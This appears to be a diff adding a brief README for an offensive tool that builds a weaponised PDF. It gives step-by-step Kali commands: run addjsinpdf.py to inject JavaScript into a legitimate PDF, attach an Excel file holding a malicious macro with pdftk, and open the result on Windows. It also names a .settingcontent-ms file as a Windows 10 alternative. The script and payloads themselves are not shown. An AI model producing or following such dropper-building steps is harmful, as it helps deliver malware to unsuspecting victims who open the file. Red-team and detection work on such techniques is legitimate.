@@ -1,0 +1,10 @@
+Place a legitimate PDF as "01.pdf" and a excel file "malicious.xls" containing malicious macro in the current directory.
+
+Execute following commands in Kali:
+apt-get install pdftk
+python addjsinpdf.py
+pdftk 02.pdf attach_file malicious.xls output final.pdf
+
+Open "final.pdf" in windows machine.
+
+NOTE: For Win10 instead of excel we can use "malicius.settingcontent-ms", if so edit "addjsinpdf.py" as well.
